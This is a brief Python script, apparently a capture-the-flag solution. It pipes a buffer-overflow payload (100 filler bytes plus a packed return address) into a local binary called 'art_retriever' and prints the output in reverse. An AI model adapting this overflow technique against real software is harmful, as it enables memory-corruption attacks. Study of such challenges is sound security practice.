import subprocess

# Path to the binary executable
binary_path = './art_retriever'

# Input data to be provided to the binary
input_data = b'a'*100 + b'\x56\x12\x40'

# Run the binary with input and capture output
process = subprocess.Popen(binary_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Provide input to the binary
output, error = process.communicate(input=input_data)
decoded_output = output.decode()

# Print the output
lines = decoded_output.split('\n')[::-1]
for line in lines:
    print(line)
